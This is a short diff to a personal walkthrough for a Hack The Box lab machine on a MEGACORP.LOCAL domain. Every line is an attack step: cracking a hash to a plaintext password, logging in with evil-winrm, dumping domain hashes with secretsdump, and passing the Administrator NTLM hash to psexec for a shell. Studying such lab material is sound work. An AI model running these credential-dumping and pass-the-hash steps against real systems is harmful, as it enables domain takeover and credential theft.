@@ -3,3 +3,5 @@
 * crack the hash with john to get => Sheffield19
 * evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19
 * secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
+* go to msfconsole use auxiliary/scanner/smb/impacket/secretsdump and get the hash(Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::)
+* python3 /home/akashamar/Desktop/HACK_THE_BOX/psexec.py Administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
